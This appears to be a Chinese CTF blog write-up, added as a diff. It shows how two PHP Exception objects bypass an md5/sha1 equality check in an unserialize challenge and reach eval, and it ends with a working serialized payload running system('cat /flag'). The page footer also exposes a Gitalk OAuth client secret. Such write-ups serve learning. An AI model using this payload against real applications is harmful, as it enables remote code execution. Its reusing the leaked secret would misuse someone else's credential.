@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="看题目源码 及 分析12345678910111213141516&lt;?phphighlight_file(__file__);class Timeline &amp;#123;        public $var3;        function __destruct()&amp;#123;            var_dump(md5($this-&gt;var1));            var">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 Exception类 绕过md5 sha1 等系列">
+<meta property="og:url" content="https://mayi077.github.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="看题目源码 及 分析12345678910111213141516&lt;?phphighlight_file(__file__);class Timeline &amp;#123;        public $var3;        function __destruct()&amp;#123;            var_dump(md5($this-&gt;var1));            var">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5f35ec6b14195aa5948243d0.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f35eea514195aa59482b8c4.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f35f0d114195aa5948340a6.jpg">
+<meta property="article:published_time" content="2020-08-14T02:45:25.000Z">
+<meta property="article:modified_time" content="2020-08-14T02:48:08.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="基础积累">
+<meta property="article:tag" content="Exception">
+<meta property="article:tag" content="MD5绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5f35ec6b14195aa5948243d0.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>利用 Exception类 绕过md5 sha1 等系列 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用 Exception类 绕过md5 sha1 等系列
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-14 10:45:25 / 修改时间：10:48:08" itemprop="dateCreated datePublished" datetime="2020-08-14T10:45:25+08:00">2020-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">基础积累</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="看题目源码-及-分析"><a href="#看题目源码-及-分析" class="headerlink" title="看题目源码 及 分析"></a>看题目源码 及 分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">class Timeline &#123;</span><br><span class="line">        public $var3;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            var_dump(md5($this-&gt;var1));</span><br><span class="line">            var_dump(md5($this-&gt;var2));</span><br><span class="line">            if( ($this-&gt;var1 !&#x3D; $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) &#x3D;&#x3D;&#x3D; md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)&#x3D;&#x3D;&#x3D; sha1($this-&gt;var2)) )&#123;</span><br><span class="line">               eval($this-&gt;var1);</span><br><span class="line">   &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[1]);</span><br><span class="line">&#x2F;&#x2F;hint</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>&emsp;这边，我们主要看如何绕过if语句，第一想到的就是数组绕过，但是eval 执行的需要是字符串，数组转为字符串后就只剩下：Array 了，显然数组绕过行不通，在加上这边同时使用了MD5 和 sha1 我们想要利用 <code>fastcoll</code> 来碰撞也不行了。</p>
+<a id="more"></a>
+<h3 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h3><p>&emsp;我们传入2个不相等对象，但是他们的__toString 魔法函数返回的一样。这就可以绕过我们的 if 了 ，且eval转为字符串时我们也像办法使其可以被执行。</p>
+<h4 id="查找带-toString-的类"><a href="#查找带-toString-的类" class="headerlink" title="查找带 __toString 的类"></a>查找带 __toString 的类</h4><p>我们使用如下代码遍历：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$classes &#x3D; get_declared_classes();  &#x2F;&#x2F;返回由已定义类的名字所组成的数组</span><br><span class="line">foreach ($classes as $c) &#123;  &#x2F;&#x2F;get_class_methods返回由类的方法名组成的数组</span><br><span class="line">if (in_array(&#39;__toString&#39;, get_class_methods($c)))</span><br><span class="line">&#123;</span><br><span class="line">echo $c.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception</span><br><span class="line">ErrorException</span><br><span class="line">Error</span><br><span class="line">ParseError</span><br><span class="line">........结果较多，我省略了</span><br><span class="line">mysqli_sql_exception</span><br></pre></td></tr></table></figure>
+
+<h4 id="我们这里利用第一个-Exception"><a href="#我们这里利用第一个-Exception" class="headerlink" title="我们这里利用第一个 Exception"></a>我们这里利用第一个 Exception</h4><p>我们去看看它的 <strong>toString 方法还回的是个什么。我直接在phpstorm中查看此类没发现它放回的是什么。接着我们看到了</strong>construct函数下面的提示：<br><a href="https://pic.downk.cc/item/5f35ec6b14195aa5948243d0.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f35ec6b14195aa5948243d0.jpg" alt=""></a><br>也就是说它返回的是一个字符串类型的异常信息，我们调试一下进行测试。（同时根据这里我们也发现我们可以控制message和code）<br><a href="https://pic.downk.cc/item/5f35eea514195aa59482b8c4.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f35eea514195aa59482b8c4.jpg" alt=""></a><br>我们发现这个string变量是将要返回的字符串，但是$ex1的string 并不等于$ex2的string，这就意味着md5值不相等（无法绕过），不过也号解决，我们只需要将$ex1 和 $ex2 放在同一行即可。但是这么一改2个类就完全相等了，就过不了<code>($this-&gt;var1 != $this-&gt;var2)</code> .<br>&emsp;此时我们想起了我们可以传入的code变量，使其不一样，那么类就不相等了。（我截图中已使用）</p>
+<h5 id="我们控制-message-来执行代码"><a href="#我们控制-message-来执行代码" class="headerlink" title="我们控制 message 来执行代码"></a>我们控制 message 来执行代码</h5><p>前面虽然已经绕过了，但是我们没有插入任何代码进去。我们知道我们可以控制的还有message，他是会在string中回显的如下<a href="https://pic.downk.cc/item/5f35f0d114195aa5948340a6.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f35f0d114195aa5948340a6.jpg" alt=""></a><br>我们可以看到外面的代码插进去了，但是怎么执行呢？它前后都有多余代码，直接这样肯定会报错的呀。</p>
+<h3 id="eval中不为人知的秘密"><a href="#eval中不为人知的秘密" class="headerlink" title="eval中不为人知的秘密"></a>eval中不为人知的秘密</h3><p>例如：我们在eval函数中执行php代码时 想要离开或重进 php 模式 怎么办？</p>
+<ol>
+<li><code>?&gt;</code>和<code>&lt;?php</code>（可以省略）之间的表示不以php代码执行（就普通字符，直接显示）</li>
+<li><code>&lt;?</code> 后面的语句继续进入php模式</li>
+<li>return 语句会立即中止当前字符串的执行。</li>
+<li>代码执行的作用域是调用 eval() 处的作用域。<br>因此，eval()里任何的变量定义、修改，都会在函数结束后被保留。<br>测试：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&quot;abc: echo \&quot;In PHP mode!\&quot;;\$a&#x3D;&#39;mayi077&#39;;return; ?&gt; in wef wer &lt;?php system(&#39;dir&#39;);&quot;);</span><br><span class="line">echo &quot;\n&quot;.$a;</span><br></pre></td></tr></table></figure>
+<a href="https://www.php.cn/php-ask-448441.html" target="_blank" rel="noopener">参考链接</a><br>补充一点:<strong>__HALT_COMPILER();</strong> 也会中止后面代码的执行。    </li>
+</ol>
+<p>但是，我们还记得string的值最前面还有个<code>Exception:</code>它不会干扰我们的语句吗？<br>事实上确实不会我们做如下测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;abc:echo 123;&quot;);  &#x2F;&#x2F;123</span><br><span class="line">eval(&quot;abc12:echo 123;&quot;); &#x2F;&#x2F;123</span><br><span class="line">eval(&quot;12a:echo 123;&quot;); &#x2F;&#x2F;报错</span><br><span class="line">eval(&quot;_12a:echo 123;&quot;);&#x2F;&#x2F;123</span><br></pre></td></tr></table></figure>
+<p>就是说冒号前是一个合法变量名的话就可以正常执行的。其实这里就牵扯到了 一个 goto 的方法：如以下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo &quot;start&quot;;</span><br><span class="line">goto mayi;</span><br><span class="line">echo &quot;nonono&quot;;</span><br><span class="line">mayi : echo &quot;\nmayi&quot;;</span><br><span class="line">echo &quot;\n077&quot;;</span><br><span class="line">----------------------------</span><br><span class="line">start</span><br><span class="line">mayi</span><br><span class="line">077</span><br></pre></td></tr></table></figure>
+<p>就是他会直接跳到我们所做的标记位置。</p>
+<h3 id="得到payload"><a href="#得到payload" class="headerlink" title="得到payload"></a>得到payload</h3><p>这边再提醒一下，因为Exception 类中有私有或保护类型 而非全部public所以我们进行urlencode进行包装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Timeline &#123;</span><br><span class="line">    public $var3;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        var_dump(md5($this-&gt;var1));</span><br><span class="line">        var_dump(md5($this-&gt;var2));</span><br><span class="line">        if( ($this-&gt;var1 !&#x3D; $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) &#x3D;&#x3D;&#x3D; md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)&#x3D;&#x3D;&#x3D; sha1($this-&gt;var2)) )&#123;</span><br><span class="line">            eval($this-&gt;var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd &#x3D;&#39;system(&quot;cat &#x2F;flag&quot;);?&gt;&#39;;</span><br><span class="line">$ex1 &#x3D; new Exception($cmd);$ex2 &#x3D; new Exception($cmd,1);</span><br><span class="line">$timeline &#x3D; new Timeline();</span><br><span class="line">$timeline-&gt;var1 &#x3D; $ex1;</span><br><span class="line">$timeline-&gt;var2 &#x3D; $ex2;</span><br><span class="line"></span><br><span class="line">echo serialize($timeline);</span><br></pre></td></tr></table></figure>
+<p>这样就可以完美绕过了。最先开始我还以为要利用到$var3呢，显然是我想多了。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/" title="利用 Exception类 绕过md5 sha1 等系列">https://mayi077.github.io/2020/08/14/利用-Exception类-绕过md5-sha1-等系列/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
+              <a href="/tags/Exception/" rel="tag"><i class="fa fa-tag"></i>Exception</a>
+              <a href="/tags/MD5%E7%BB%95%E8%BF%87/" rel="tag"><i class="fa fa-tag"></i>MD5绕过</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/10/saferEval%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-and-setTimeout-%E7%BB%95%E8%BF%87/" rel="prev" title="saferEval沙箱逃逸 and setTimeout 绕过">
+      <i class="fa fa-chevron-left"></i> saferEval沙箱逃逸 and setTimeout 绕过
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/14/phpBug-69892/" rel="next" title="phpBug#69892">
+      phpBug#69892 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#看题目源码-及-分析"><span class="nav-number">1.</span> <span class="nav-text">看题目源码 及 分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题分析"><span class="nav-number">2.</span> <span class="nav-text">解题分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查找带-toString-的类"><span class="nav-number">2.1.</span> <span class="nav-text">查找带 __toString 的类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#我们这里利用第一个-Exception"><span class="nav-number">2.2.</span> <span class="nav-text">我们这里利用第一个 Exception</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们控制-message-来执行代码"><span class="nav-number">2.2.1.</span> <span class="nav-text">我们控制 message 来执行代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eval中不为人知的秘密"><span class="nav-number">3.</span> <span class="nav-text">eval中不为人知的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#得到payload"><span class="nav-number">4.</span> <span class="nav-text">得到payload</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '86752fc133cb5872d4d3f7c2f3f27b3e',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
